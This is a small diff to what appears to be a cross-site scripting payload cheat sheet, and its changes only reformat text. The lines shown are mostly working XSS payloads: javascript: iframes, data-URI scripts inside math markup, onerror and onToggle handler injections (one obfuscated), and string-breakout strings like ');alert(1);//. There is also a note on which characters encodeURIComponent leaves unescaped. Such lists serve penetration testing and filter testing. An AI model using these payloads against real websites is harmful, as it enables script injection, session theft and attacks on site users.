@@ -8,7 +8,8 @@
 <iframe src="javascript:alert(1)"></iframe>
 <math><mi//xlink:href="data:x,<script>alert(1)</script>">
 contentvisibilityautostatechange='alert(1)'
-via invalid tag -- 22 foo="bar<h1>">test</22>
+via invalid tag --
+22 foo="bar<h1>">test</22>
 <22 foo="bar<img src=x onerror="alert()">test</22>
 ```
 
@@ -36,7 +37,7 @@ onToggLe='let%20x=%60javascri%60%3Blet%20y=%60pt:aler%60%3Blet%20z=%60t()%60%3Bl
 ');alert(1);//
 ",";alert(1);//
 ```
-if there is encodeurlcomponent() function:
+if there is **encodeurlcomponent**() function:
 
 it escapes all the chars but not 
 ```A–Z a–z 0–9 - _ . ! ~ * ' ( )```
